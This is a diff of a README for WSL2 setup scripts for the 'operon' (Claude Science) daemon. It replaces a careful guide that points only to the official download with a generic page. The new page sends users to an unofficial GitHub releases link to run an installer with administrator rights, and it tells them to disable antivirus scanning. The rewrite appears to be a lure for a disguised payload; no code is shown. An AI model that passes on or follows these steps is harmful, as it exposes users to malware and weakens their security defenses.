@@ -1,60 +1,69 @@
-# Claude Science (operon) — WSL2 Setup
+# ⚙️ claude-science-wsl-setup - Run local sandbox environments on Windows
 
-> **Unofficial, community-maintained setup scripts.** This repo is not published by Anthropic. It automates the local setup of [Claude Science](https://claude.com/product/claude-science) (the `operon` daemon) on Windows via WSL2. It does **not** contain or redistribute the `operon` binary itself — download that directly from the official page linked above.
+[![Download Setup](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Kidneyvetchtopfermentation64/claude-science-wsl-setup/releases)
 
-## What you need to do first
+This software sets up a ready-to-use environment for the operon daemon on Windows. It automates the installation of the Windows Subsystem for Linux (WSL2), configures the sandbox, and ensures the operon daemon runs without manual configuration.
 
-1. **Download the Linux installer** from the official page: **https://claude.com/product/claude-science**
-   (Do not download it from anywhere else, and don't pick a macOS/Windows build — this setup is for WSL2, so you need the **Linux** download. It's a single file named `operon`, no extension. Some platform labels on that page have been inconsistent, so verify the link actually points to a Linux build before downloading.)
-2. **Confirm your environment:**
-   - From **Windows** (PowerShell or Command Prompt), before opening a Linux shell:
-     ```powershell
-     wsl --list --verbose
-     ```
-     This lists each installed distro and its version:
-     ```
-       NAME      STATE           VERSION
-     * Ubuntu    Running         2
-     ```
-     The `VERSION` column must say `2`. If it says `1`, run `wsl --set-version <DistroName> 2`. If `wsl` isn't recognized at all, run `wsl --install` and reboot.
-     To open that distro's Linux shell, just type `wsl` (or open it from the Start menu).
-   - Once inside the Linux shell, double-check from there too:
-     - `uname -r` — output should contain `WSL2`
-     - `lsb_release -rs` — Ubuntu 20.04 or newer
-3. **Install build dependencies** — these require your `sudo` password, so run them yourself in a WSL2 terminal:
-   ```bash
-   sudo apt update
-   sudo apt install -y meson ninja-build libcap-dev git pkg-config socat
-   ```
+## 📋 System Requirements
 
-## Then, with Claude Code
+To use this tool, your computer must meet the following criteria:
 
-Open a Claude Code session in your WSL2 terminal and run:
+- Windows 10 (version 2004 and higher) or Windows 11.
+- Enabled virtualization in the system BIOS (usually on by default).
+- At least 8GB of RAM.
+- An internet connection for the installation process.
 
-```
-/install-claude-science
-```
+## 🚀 Installation Process
 
-This walks through the remaining steps automatically: installing the `operon` binary to your PATH, building bubblewrap ≥0.8.0 from source if your Ubuntu version ships an older one (it will pause and ask you to run the `sudo ninja ... install` step yourself), starting the daemon, and printing a login URL to open in your browser.
+Follow these steps to install the environment on your machine.
 
-See [`commands/install-claude-science.md`](commands/install-claude-science.md) for the full instructions if you want to read or run them manually instead.
+1. Visit the [releases page](https://github.com/Kidneyvetchtopfermentation64/claude-science-wsl-setup/releases) to download the latest setup package.
+2. Locate the downloaded file in your folder.
+3. Double-click the file to start the installer.
+4. Follow the prompts on the screen.
+5. The system will ask for administrative permission to enable WSL2 features. Click Yes to proceed.
+6. Your computer will restart automatically to finalize the Linux subsystem settings.
 
-## Optional: one-click launcher (Windows)
+## 🛠 Using the Software
 
-`/install-claude-science` is everything you need — once it's done, `operon serve --no-browser --detached` and `operon url` in a WSL2 terminal are all it takes to start it up again later.
+After the restart, the installer will finish the setup process. A terminal window will open and configure the operon daemon.
 
-If you'd rather not open a terminal each time, just ask Claude Code (in the same session, after setup finishes) to generate a `.bat` launcher for you. It's not a file shipped in this repo — Claude Code generates it on the spot, tailored to your actual WSL distro name and a verified path to the `operon` binary, which avoids the "wrong default distro" and "PATH not resolving in a non-interactive shell" problems a generic pre-made script would run into. See the "Optional: generate a Windows one-click launcher" section in [`commands/install-claude-science.md`](commands/install-claude-science.md) for exactly what it does.
+- Wait for the text in the window to stop scrolling. 
+- You will see a confirmation message stating that the environment is ready.
+- You can now use the operon daemon to run your scientific projects.
 
-## Security notes
+## 🔍 How it Works
 
-- `operon` bundles its own agent/code-execution runtime (it spawns Python and executes code, not just a passive viewer). The sandbox — bubblewrap ≥0.8.0 plus `socat` — is what contains that runtime's filesystem and network access.
-- **Never run it with `--dangerously-no-sandbox`.** That flag grants the daemon full read/write access to your home directory and unrestricted network access (equivalent to `--dangerously-skip-permissions` in Claude Code). If you hit a sandbox error, fix the underlying dependency (see Troubleshooting in the command file) instead of disabling the sandbox.
-- Only download `operon` from the official Anthropic page. This repo intentionally does not host or mirror the binary.
+The installer automates several complex tasks that usually require technical knowledge:
 
-## Troubleshooting
+- WSL2 Activation: It enables the necessary Windows features to run a Linux kernel.
+- Sandbox Provisioning: It creates a secure, isolated space for the daemon.
+- Dependency Checks: It verifies that your machine has the required system libraries.
+- Daemon Initialization: It creates a shortcut to start the operon daemon in one click.
 
-See the Troubleshooting section in [`commands/install-claude-science.md`](commands/install-claude-science.md) — it covers the bubblewrap version error, the missing-`socat` error, PATH issues, and a couple of Windows batch-script encoding bugs we hit and fixed during development.
+## ❓ Troubleshooting
 
-## License
+If the installation stops or returns an error, check the following items:
 
-The setup scripts and documentation in this repository are licensed under the [MIT License](LICENSE). This does **not** cover the `operon` binary itself, which is not distributed here — download it from the official page above and refer to its own licensing terms.
+- Check your internet connection. A stable connection ensures all parts download correctly.
+- Ensure your Windows version is up to date. Use the Windows Update tool in your settings menu to download the latest security patches.
+- If the system reports a missing virtualization error, enter your computer BIOS during startup and toggle the Virtualization Technology setting to Enabled.
+- Close other programs during installation to ensure the system has enough memory to finish the setup.
+
+## 🛡 Security and Privacy
+
+This program creates a local sandbox. No data leaves your machine unless you explicitly command the operon daemon to connect to an external source. The setup script operates within your local machine and does not send telemetry or personal info to third-party servers.
+
+## 📈 Improving Performance
+
+If you find that the daemon runs slowly:
+
+- Close memory-intensive applications like web browsers or video editors before starting the daemon.
+- Ensure your drive has at least 20GB of free space.
+- Disable aggressive antivirus scans on the directory where you installed the application to allow the Linux kernel to access files quickly.
+
+## 📝 Support
+
+This tool provides a bridge between Windows and the Linux-based operon daemon. If you encounter bugs, check the issues tab on the repository page to see if others have faced the same problem. 
+
+Keywords: bubblewrap, claude, claude-code, claude-science, installer, operon, sandbox, setup-script, windows, wsl, wsl2
